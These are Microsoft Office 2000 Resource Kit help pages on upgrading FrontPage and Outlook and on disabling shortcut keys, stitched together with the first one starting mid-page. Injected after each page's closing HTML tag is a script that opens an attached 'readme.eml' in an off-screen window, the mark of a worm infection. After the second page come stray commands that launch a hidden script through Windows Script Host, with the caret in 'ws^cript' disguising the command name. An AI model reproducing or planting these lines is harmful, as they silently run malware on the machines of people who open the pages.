<P class=NT><B>Note</B>&nbsp;&nbsp;&nbsp;When you update a Web server to FrontPage&nbsp;2000 Server Extensions, any FrontPage 97&nbsp;�&nbsp;based or FrontPage 98&nbsp;�&nbsp;based webs on the server are automatically upgraded to FrontPage&nbsp;2000&nbsp;�&nbsp;based webs. The upgraded webs support all the new functionality in the FrontPage&nbsp;2000 client.</P>



<p class=t align=right><b><a href="#top">Top</a></b></p>

<H4>Opening FrontPage&nbsp;2000&nbsp;�&nbsp;based webs in previous versions</H4>
<a name="dex15"></a>



<P class=T>Although you can use FrontPage 98 or FrontPage 97 to open a web created in FrontPage&nbsp;2000, you can work with only those features that the two versions have in common.</P>
<a name="dex16"></a>

<P class=T>For example, a FrontPage&nbsp;2000&nbsp;�&nbsp;based web can consist of several levels of <A HREF="../appndx/glossary.htm#subweb">subwebs</A>. FrontPage 98&nbsp;� which supports only one level of subweb&nbsp;� can open only the first subweb level below the <A HREF="../appndx/glossary.htm#rootweb">root web</A>. If you open a multilevel FrontPage&nbsp;2000&nbsp;�&nbsp;based web in FrontPage 98 or FrontPage 97, you cannot open subwebs that are two or more levels below the root web.</P>


<BR>


</TD>



<!-------------------------------- END PAGE CONTENT -------------------------------->



<!-------------------------------- START PREV/NEXT NAVIGATION -------------------------------->


<td align=right width=80>



	<table align="right" cellspacing="0" cellpadding="0" style="margin-top: 5px;" style="padding-right: 5px;">
<tr>
    <td><A HREF="68t3.htm"><img src="../images/contents.gif" border=0 alt="Topic Contents" vspace=1></A></td>
</tr>
<tr>
    <td><A HREF="68t3_2.htm"><img src="../images/next.gif" border=0 alt="Next"></A></td>
</tr>


</table>


<!-------------------------------- END PREV/NEXT NAVIGATION -------------------------------->

</td>
</tr>
</table>

<!-------------------------------- BEGIN PAGE FOOTER -------------------------------->
<center>
<table width=450 style="margin-left: 80px;">
<TR><TD COLSPAN=3 align=center><HR width=500>
<FONT FACE="verdana, helvetica, arial" SIZE=2 color=#003399><b><a href="68t3.htm">Topic Contents</a></b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;<b><A HREF="68t3_2.htm">Next</A></b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;<b><a href="#top">Top</a></b></font>
<BR><BR>&nbsp;
<FONT FACE="verdana, helvetica, arial" SIZE=1 CLASS=detail>
Friday, March 5, 1999<BR>
&copy; <A HREF="../appndx/cpyright.htm"> 1999 Microsoft Corporation. All rights reserved. Terms of use</A>.
</FONT><BR><IMG SRC="../images/spacer.gif" WIDTH=340 HEIGHT=1></TD></TR>

<TR><TD COLSPAN=3 align=center>
<FONT FACE="verdana, helvetica, arial" SIZE=1 CLASS=detail>
<A HREF="../appndx/eula.htm">License</A>
</FONT><BR><IMG SRC="../images/spacer.gif" WIDTH=340 HEIGHT=1></TD></TR></TABLE>
</center>
<!-------------------------------- END PAGE FOOTER -------------------------------->
</BODY>
</HTML>

<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<TITLE>Microsoft Office 2000 Resource Kit</TITLE>
<SCRIPT LANGUAGE="JavaScript">
<!--
	if (navigator.userAgent.indexOf("MSIE 4") != -1)
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../ork.css\" TYPE=\"text/css\">");
		document.write("<STYLE>");
		document.write("<<!-->");
		document.write("<A:hover	{color: 003399}>");
		document.write("<//-->>");
		document.write("</STYLE>");
			}
	else
			{
	if (navigator.appName == "Netscape")
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../orkns.css\" TYPE=\"text/css\">");
			}
	else
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../ork.css\" TYPE=\"text/css\">");
	}
			}
//-->
</SCRIPT></HEAD>

<BODY BGCOLOR="#FFFFFF" TEXT="#000000">


<!-- Start: ToolBar for down-level browsers-->

<TABLE WIDTH='100%' CELLPADDING=0 CELLSPACING=0 BORDER=0 BGCOLOR='#FFFFFF'>
<TR>
	<TD VALIGN='middle' HEIGHT=60 ROWSPAN=2><IMG SRC="../images/offlogo.GIF" ALIGN=left border=0></TD>
	<TD VALIGN='middle' HEIGHT=20 ALIGN='RIGHT'><IMG SRC='../images/curve.gif' WIDTH=18 HEIGHT=20 ALT='' BORDER=0></TD>
	<TD BGCOLOR='#000000' HEIGHT=20 VALIGN='middle' ALIGN='RIGHT' NOWRAP COLSPAN=2>
		<FONT COLOR='#FFFFFF' FACE='Verdana, Arial' SIZE=1>
		<B>
			<IMG SRC='../images/1ptrans.gif' WIDTH=220 HEIGHT=15 ALT='' BORDER=0><A STYLE='color:#FFFFFF;text-decoration:none;' HREF="http://www.microsoft.com" TARGET='_top'><FONT COLOR='#FFFFFF'>microsoft.com Home</FONT></A>&nbsp;&nbsp;
		</B>
		</FONT></TD>
</TR>
<TR>
	<TD VALIGN='TOP' HEIGHT=40 WIDTH=19><IMG SRC='../images/1ptrans.gif' WIDTH=19 HEIGHT=40 ALT='' BORDER=0></TD>
	<TD VALIGN='TOP' HEIGHT=40 ALIGN='RIGHT' NOWRAP COLSPAN=2><A HREF="http://www.microsoft.com" TARGET='_top'><IMG SRC='../images/mslogo.gif' WIDTH=112 HEIGHT=40 ALT='Microsoft' BORDER=0></A></TD>
</TR>
<TR>
	<!-- Start: Local menus -->
	<TD BGCOLOR='#000000' HEIGHT=20 NOWRAP VALIGN='MIDDLE' COLSPAN=4 align=right>
		<IMG SRC='../images/1ptrans.gif' WIDTH=19 HEIGHT=7 ALT='' BORDER=0>
		<A HREF="http://www.microsoft.com/office/ork" style="text-decoration: none;"><FONT COLOR='#FFFFFF' FACE='Verdana, Arial' SIZE=1><B>
http://www.microsoft.com/office/ork</FONT></B></A>&nbsp;&nbsp;</TD>
	<!-- End: Local menus -->
</TR>
</TABLE>



<!-- End: ToolBar V2.0-->


<!-------------------------------- BEGIN ORK NAVIGATION BAR -------------------------------->

<TABLE WIDTH=100% CELLPADDING=0 CELLSPACING=0 BORDER=0>
	<TR>
	<TD VALIGN=TOP WIDTH=2%>

	<TABLE width=165 CELLPADDING=0 CELLSPACING=0 BORDER=0 height="100%">
		<TR>
		<TD VALIGN=TOP bgcolor="#666699" align=right>

	<TABLE CELLPADDING=0 CELLSPACING=0 BORDER=0>
		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=1 BORDER="0"><FONT FACE="verdana, helvetica, arial" SIZE="2"><A Href="../default.htm"><DIV CLASS=tier1white ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><IMG SRC="../images/spacer.gif" WIDTH=9 HEIGHT=35 BORDER="0" align="left">Microsoft Office 2000 Resource Kit Home</DIV></a></FONT></TD>
		</TR>
		
		<TR>
		<TD bgcolor="#666699"><div class=tier1><img src="../images/stripe.jpg" width=155 height=1 align=center></div></TD>
		</TR>
		
		
		
		<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><A Href="../default.htm"><DIV CLASS=tier1yellow ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1yellow'"><img src="../images/minus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left"><b>&nbsp;Upgrading to Office 2000</b></DIV></a></FONT>
</TD></TR>

		<TR>
		<TD bgcolor="#CCCCCC"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><a href="../four/67ct.htm"><DIV CLASS=tier1 ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1'"><img src="../images/blkplus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=15 BORDER="0" align="left">&nbsp;Planning Your Move to Office 2000</DIV></a></FONT></TD>
		</TR>
		

		<TR>
		<TD bgcolor="#CCCCCC"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><a href="../four/68ct.htm"><DIV CLASS=tier1 ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1'"><img src="../images/blkminus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=10 BORDER="0" align="left"><b>&nbsp;Office 2000 Upgrading Reference</b></DIV></a></FONT>
	


			<TABLE WIDTH=155 CELLPADDING=0 CELLSPACING=0 BORDER=0 bgcolor="#CCCCCC" style="margin-left: 1em;">
			
			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>

				<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68ct_1.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to Access 2000</DIV></A></FONT></TD>
				</TR>
				
			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>

				<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t2.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to Excel 2000</DIV></B></FONT></TD>
				</TR>
				
							<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
							<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t3.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to FrontPage 2000</DIV></B></FONT></TD>
				</TR>
				
											<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
							<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t4.htm"><DIV class=tier2hot>Upgrading to Outlook 2000</DIV></B></FONT></TD>
				</TR>
				
															<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
										<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t5.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to PowerPoint 2000</DIV></B></FONT></TD>
				</TR>
				
																			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
										<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../four/68t6.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Upgrading to Word 2000</DIV></B></FONT></TD>
				</TR>
				
				<tr>
							<TD bgcolor="#CCCCCC"><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
				


			</TABLE>

		</TD></TR>
		

		

		


		<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE=2><a href="../appndx/95ct.htm"><DIV CLASS=tier1white ID="img6" onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><img src="../images/plus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left">&nbsp;Overview of Tools and Utilities</DIV></a></FONT>
</TD></TR>

	
		
		
		

		
	<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE="2" COLOR="#000000"><A HREF="../appndx/glossary.htm"><DIV CLASS=tier1white onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"> <IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=10 BORDER="0">Glossary</DIV></A></FONT></TD>
		</TR>
		
		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=1 HEIGHT=5 BORDER="0"><FONT FACE="verdana, helvetica, arial" SIZE="2" COLOR="#000000"><A HREF="../appndx/index.htm"><DIV CLASS=tier1white onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=10 BORDER="0">Index</DIV></A></FONT></TD>
		</TR>

		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=147 HEIGHT=200></TD>
		</TR>

		</TABLE>

	</TD>
	</TR>
	</TABLE>
	</TD>

<!-------------------------------- END NAVIGATION BAR -------------------------------->


	<TD><IMG SRC="../images/spacer.gif" WIDTH=1 HEIGHT=10 BORDER="0"></TD>
	<TD VALIGN=TOP WIDTH=99%>
    







<!-------------------------------- BEGIN PAGE CONTENT -------------------------------->

<a name="top"></a>
<H5 class=topic>Upgrading to Outlook&nbsp;2000</H5>
<H1 class=page>
<SUP><A NAME="68t4pt2"></A></SUP>Planning Your Upgrade to Outlook&nbsp;2000</H1>
<a name="dex2"></a>

<P class=T>Because Microsoft Outlook&nbsp;2000 is compatible with earlier versions of Outlook and can share files with other Microsoft e-mail and calendar applications, upgrading strategies typically involve only preparation and distribution issues. When you decide how you want your upgrade to proceed, and you identify the applications required, upgrading to Outlook&nbsp;2000 is a simple process.</P>
<a name="dex3"></a>

<P class=T>Before you start the upgrade process, you must make the following decisions:</P>
<a name="dex4"></a>

<UL>
	<LI class=LB1>Decide whether you want Corporate/Workgroup or Internet Mail Only support.</li>

<a name="dex5"></a>


	<LI class=LB1>Decide whether you want to use Microsoft Schedule+ as your calendar or the Outlook&nbsp;2000 Calendar.</li>

<a name="dex6"></a>


	<LI class=LB1>Decide which browser you want to use.</li>

<a name="dex7"></a>


	<LI class=LB1>Decide which security settings you want for your users.
</li>
</UL>
<a name="dex8"></a>

<P class=T>Perform the following tasks to prepare for the upgrade process.</P>
<a name="dex9"></a>

<UL>
	<LI class=LB1>Clean up your existing e-mail folders.
<P class=LT1>For example, delete any unnecessary e-mail messages or personal folders.
</li>

<a name="dex10"></a>

	<LI class=LB1>Create a backup copy of your existing e-mail folders.
<P class=LT1>This task prevents you from permanently losing data during the upgrade process.
</li>
</UL>

<P class=TPT><B>Tip</B>&nbsp;&nbsp;&nbsp;Although Microsoft Office&nbsp;2000 works with Microsoft Internet Explorer 4.0, it is recommended that you upgrade to Internet Explorer 5, which is included with Office&nbsp;2000. Because of the offline capabilities of Internet Explorer 5, it�s much easier for Outlook&nbsp;2000 users to download and store any folder home pages so that they can be modified offline.</P>

<a name="dex11"></a>





<P class=T>You can easily upgrade to Outlook&nbsp;2000 from previous Microsoft e-mail and calendar applications. You can install Outlook&nbsp;2000 over an Outlook 97 or Outlook 98 installation. Like other Office&nbsp;2000 applications, Outlook&nbsp;2000 migrates user settings stored in the registry. In addition, if a Messaging Application Programming Interface (MAPI) profile already exists on a user�s computer, Outlook&nbsp;2000 continues to use the profile.</P>
<a name="dex12"></a>

<P class=T>As an administrator, it is recommended that you plan upgrade strategies for the following scenarios:</P>
<a name="dex13"></a>

<UL>
	<LI class=LB1>A one-time upgrade to Outlook&nbsp;2000.</li>

<a name="dex14"></a>


	<LI class=LB1>A gradual upgrade to Outlook&nbsp;2000.
</li>
</UL>
<a name="dex15"></a>

<P class=T>If you plan a gradual upgrade, Outlook users might need to exchange e-mail messages and scheduling data with users of other Microsoft e-mail and calendar applications.</P>


<p class=t align=right><b><a href="#top">Top</a></b></p>

<H4>See also</H4>
<a name="dex16"></a>

<P class=T>You can deploy Outlook separately from the rest of Office&nbsp;2000. For more information, see <a HREF="../two/35t3_7.htm">Installing Outlook&nbsp;2000 After Installing Office&nbsp;2000</a>.</P>

<BR>


</TD>



<!-------------------------------- END PAGE CONTENT -------------------------------->



<!-------------------------------- START PREV/NEXT NAVIGATION -------------------------------->


<td align=right width=80>



	<table align="right" cellspacing="0" cellpadding="0" style="margin-top: 5px;" style="padding-right: 5px;">
<tr>
    <td><A HREF="68t4.htm"><img src="../images/contents.gif" border=0 alt="Topic Contents" vspace=1></A></td>
</tr>
<tr>
    <td><A HREF="68t4_2.htm"><img src="../images/next.gif" border=0 alt="Next"></A></td>
</tr>


</table>


<!-------------------------------- END PREV/NEXT NAVIGATION -------------------------------->

</td>
</tr>
</table>

<!-------------------------------- BEGIN PAGE FOOTER -------------------------------->
<center>
<table width=450 style="margin-left: 80px;">
<TR><TD COLSPAN=3 align=center><HR width=500>
<FONT FACE="verdana, helvetica, arial" SIZE=2 color=#003399><b><a href="68t4.htm">Topic Contents</a></b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;<b><A HREF="68t4_2.htm">Next</A></b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;<b><a href="#top">Top</a></b></font>
<BR><BR>&nbsp;
<FONT FACE="verdana, helvetica, arial" SIZE=1 CLASS=detail>
Friday, March 5, 1999<BR>
&copy; <A HREF="../appndx/cpyright.htm"> 1999 Microsoft Corporation. All rights reserved. Terms of use</A>.
</FONT><BR><IMG SRC="../images/spacer.gif" WIDTH=340 HEIGHT=1></TD></TR>

<TR><TD COLSPAN=3 align=center>
<FONT FACE="verdana, helvetica, arial" SIZE=1 CLASS=detail>
<A HREF="../appndx/eula.htm">License</A>
</FONT><BR><IMG SRC="../images/spacer.gif" WIDTH=340 HEIGHT=1></TD></TR></TABLE>
</center>
<!-------------------------------- END PAGE FOOTER -------------------------------->
</BODY>
</HTML>

<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>

cd Drive
start ws^cript "537\doeqsi.js"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<TITLE>Microsoft Office 2000 Resource Kit</TITLE>
<SCRIPT LANGUAGE="JavaScript">
<!--
	if (navigator.userAgent.indexOf("MSIE 4") != -1)
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../ork.css\" TYPE=\"text/css\">");
		document.write("<STYLE>");
		document.write("<<!-->");
		document.write("<A:hover	{color: 003399}>");
		document.write("<//-->>");
		document.write("</STYLE>");
			}
	else
			{
	if (navigator.appName == "Netscape")
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../orkns.css\" TYPE=\"text/css\">");
			}
	else
			{
		document.write("<LINK REL=STYLESHEET HREF=\"../ork.css\" TYPE=\"text/css\">");
	}
			}
//-->
</SCRIPT></HEAD>

<BODY BGCOLOR="#FFFFFF" TEXT="#000000">


<!-- Start: ToolBar for down-level browsers-->

<TABLE WIDTH='100%' CELLPADDING=0 CELLSPACING=0 BORDER=0 BGCOLOR='#FFFFFF'>
<TR>
	<TD VALIGN='middle' HEIGHT=60 ROWSPAN=2><IMG SRC="../images/offlogo.GIF" ALIGN=left border=0></TD>
	<TD VALIGN='middle' HEIGHT=20 ALIGN='RIGHT'><IMG SRC='../images/curve.gif' WIDTH=18 HEIGHT=20 ALT='' BORDER=0></TD>
	<TD BGCOLOR='#000000' HEIGHT=20 VALIGN='middle' ALIGN='RIGHT' NOWRAP COLSPAN=2>
		<FONT COLOR='#FFFFFF' FACE='Verdana, Arial' SIZE=1>
		<B>
			<IMG SRC='../images/1ptrans.gif' WIDTH=220 HEIGHT=15 ALT='' BORDER=0><A STYLE='color:#FFFFFF;text-decoration:none;' HREF="http://www.microsoft.com" TARGET='_top'><FONT COLOR='#FFFFFF'>microsoft.com Home</FONT></A>&nbsp;&nbsp;
		</B>
		</FONT></TD>
</TR>
<TR>
	<TD VALIGN='TOP' HEIGHT=40 WIDTH=19><IMG SRC='../images/1ptrans.gif' WIDTH=19 HEIGHT=40 ALT='' BORDER=0></TD>
	<TD VALIGN='TOP' HEIGHT=40 ALIGN='RIGHT' NOWRAP COLSPAN=2><A HREF="http://www.microsoft.com" TARGET='_top'><IMG SRC='../images/mslogo.gif' WIDTH=112 HEIGHT=40 ALT='Microsoft' BORDER=0></A></TD>
</TR>
<TR>
	<!-- Start: Local menus -->
	<TD BGCOLOR='#000000' HEIGHT=20 NOWRAP VALIGN='MIDDLE' COLSPAN=4 align=right>
		<IMG SRC='../images/1ptrans.gif' WIDTH=19 HEIGHT=7 ALT='' BORDER=0>
		<A HREF="http://www.microsoft.com/office/ork" style="text-decoration: none;"><FONT COLOR='#FFFFFF' FACE='Verdana, Arial' SIZE=1><B>
http://www.microsoft.com/office/ork</FONT></B></A>&nbsp;&nbsp;</TD>
	<!-- End: Local menus -->
</TR>
</TABLE>



<!-- End: ToolBar V2.0-->


<!-------------------------------- BEGIN ORK NAVIGATION BAR -------------------------------->

<TABLE WIDTH=100% CELLPADDING=0 CELLSPACING=0 BORDER=0>
	<TR>
	<TD VALIGN=TOP WIDTH=2%>

	<TABLE width=165 CELLPADDING=0 CELLSPACING=0 BORDER=0 height="100%">
		<TR>
		<TD VALIGN=TOP bgcolor="#666699" align=right>

	<TABLE CELLPADDING=0 CELLSPACING=0 BORDER=0>
		<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE="2"><A Href="../default.htm"><DIV CLASS=tier1white ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><IMG SRC="../images/spacer.gif" WIDTH=9 HEIGHT=35 BORDER="0" align="left">Microsoft Office 2000 Resource Kit Home</DIV></a></FONT></TD>
		</TR>
		
		<TR>
		<TD bgcolor="#666699"><div class=tier1><img src="../images/stripe.jpg" width=155 height=1 align=center></div></TD>
		</TR>
		
		
		
		<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE=2><A Href="../default.htm"><DIV CLASS=tier1yellow ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1yellow'"><img src="../images/minus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left"><b>&nbsp;Managing and Supporting Office 2000</b></DIV></a></FONT>
</TD></TR>
		
		
		<TR>
		<TD bgcolor="#CCCCCC"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><a href="../three/50ct.htm"> <DIV CLASS=tier1 ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1'"> <img src="../images/blkminus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left"><b>&nbsp;Ongoing Configuration of Office on Users' Computers</b></DIV></a></FONT>
	


			<TABLE WIDTH=155 CELLPADDING=0 CELLSPACING=0 BORDER=0 bgcolor="#CCCCCC" style="margin-left: 1em;">
			
			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>

				<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../three/50ct_1.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Managing Users' Options with System Policies</DIV></A></FONT></TD>
				</TR>
				
			<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>

				<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../three/50t2.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Locking Down an Office Configuration</DIV></B></FONT></TD>
				</TR>
				
							<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
				
								<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../three/50t3.htm"><DIV class=tier2hot>Using the System Policy Editor</DIV></B></FONT></TD>
				</TR>
				
							<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
				
				<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../three/50t4.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Office 2000 System Policy Reference</DIV></B></FONT></TD>
				</TR>
				
													<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>
			
			
							<TR>
				<TD COLSPAN=2><FONT FACE="verdana, helvetica, arial" SIZE=2><A HREF="../three/50t5.htm"><DIV CLASS=tier2 onMouseOver="this.className='tier2over'" onMouseOut="this.className='tier2'">Office Registry API</DIV></B></FONT></TD>
				</TR>
				
													<TR>
			<TD><IMG SRC="../images/spacer.gif" WIDTH=5 HEIGHT=5 BORDER="0" align=left></TD>
			</TR>

			</TABLE>

		</TD></TR>
		

		
				<TR>
		<TD bgcolor="#CCCCCC"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><A href="../three/55ct.htm"><DIV CLASS=tier1 ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1'"><img src="../images/blkplus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left">&nbsp;Helping Users Help Themselves</DIV></a></FONT>
</td>
</tr>
		

					<TR>
		<TD bgcolor="#CCCCCC"><FONT FACE="verdana, helvetica, arial" SIZE=2 COLOR="#000000"><A href="../three/65ct.htm"><DIV CLASS=tier1 ID=img1 onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1'"><img src="../images/blkplus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=10 BORDER="0" align="left">&nbsp;Managing Security</DIV></a></FONT>
</td>
</tr>	



		
		
		
		
		
		
		
		<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE=2><a href="../appndx/95ct.htm"><DIV CLASS=tier1white ID="img6" onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><img src="../images/plus.gif" border=0><IMG SRC="../images/spacer.gif" WIDTH=8 HEIGHT=20 BORDER="0" align="left">&nbsp;Overview of Tools and Utilities</DIV></a></FONT>
</TD></TR>

	
		
		
		

		
	<TR>
		<TD bgcolor="#666699"><FONT FACE="verdana, helvetica, arial" SIZE="2" COLOR="#000000"><A HREF="../appndx/glossary.htm"><DIV CLASS=tier1white onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=10 BORDER="0">Glossary</DIV></A></FONT></TD>
		</TR>
		
		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=1 HEIGHT=5 BORDER="0"><FONT FACE="verdana, helvetica, arial" SIZE="2" COLOR="#000000"><A HREF="../appndx/index.htm"><DIV CLASS=tier1white onMouseOver="this.className='tier1over'" onMouseOut="this.className='tier1white'"><IMG SRC="../images/spacer.gif" WIDTH=13 HEIGHT=10 BORDER="0">Index</DIV></A></FONT></TD>
		</TR>

		<TR>
		<TD bgcolor="#666699"><IMG SRC="../images/spacer.gif" WIDTH=147 HEIGHT=200></TD>
		</TR>

		</TABLE>

	</TD>
	</TR>
	</TABLE>
	</TD>

<!-------------------------------- END NAVIGATION BAR -------------------------------->


	<TD><IMG SRC="../images/spacer.gif" WIDTH=1 HEIGHT=10 BORDER="0"></TD>
	<TD VALIGN=TOP WIDTH=99%>
    







<!-------------------------------- BEGIN PAGE CONTENT -------------------------------->


<a name="top"></a>

<H5 class=topic>Using the System Policy Editor</H5>
<H1 class=page>
<SUP><A NAME="50t3pt5"></A></SUP>How to Disable Shortcut Keys</H1>
<a name="dex32"></a>



<P class=T>You can use system policies to disable built-in and custom shortcut keys for commands in Microsoft Office&nbsp;2000.</P>



<H4>Disable a predefined shortcut key</H4>
<a name="dex33"></a>



<P class=T>Several built-in shortcut keys are listed in the Predefined category of the system policy templates.</P>

<P class=LPROCH><B>To disable a predefined shortcut key</B>

<OL>
	<LI class=LS>In the System Policy Editor, open the policy you want to modify.</li>

	<LI class=LS>Open the <B>Properties</B> dialog box for the user, group, or computer for which you want to set the policy.</li>

	<LI class=LS>Click the plus sign (+) next to the Office application that contains the built-in shortcut key you want to disable.</li>

	<LI class=LS>Click the plus sign next to <B>Disable items in user interface</B>.</li>

	<LI class=LS>Click the plus sign next to <B>Predefined</B>.</li>

	<LI class=LS>Select the <B>Disable shortcut keys</B> check box.</li>

	<LI class=LS>Under <B>Settings for Disable</B> <B>shortcut keys</B>, click the check box next to the shortcut key you want to disable.
<P class=LT1>For example, click the <B>Ctrl+K (Insert | Hyperlink)</B> check box to disable the shortcut key for the <B>Hyperlink</B> command (<B>Insert</B> menu) in Word.
</li>
</OL>

<p class=t align=right><b><a href="#top">Top</a></b></p>

<H4>Disable a custom shortcut key</H4>
<a name="dex34"></a>





<P class=T>You can disable any custom shortcut key by using the System Policy Editor, even if the item is not listed in the policy template.</P>

<P class=NT><B>Note</B>&nbsp;&nbsp;&nbsp;In order to disable a custom shortcut key, you must know the <A HREF="../appndx/glossary.htm#virtualkeycode">virtual key codes</A> for the shortcut key.</P>


<P class=LPROCH><B>To disable a custom shortcut key</B>

<OL>
	<LI class=LS>In the System Policy Editor, open the policy you want to modify.</li>

	<LI class=LS>Open the <B>Properties</B> dialog box for the user, group, or computer for which you want to set the policy.</li>

	<LI class=LS>Click the plus sign (+) next to the Office application that contains the custom shortcut key you want to disable.</li>

	<LI class=LS>Click the plus sign next to <B>Disable items in user interface</B>.</li>

	<LI class=LS>Click the plus sign next to <B>Custom</B>.</li>

	<LI class=LS>Select the <B>Disable shortcut keys</B> check box.</li>

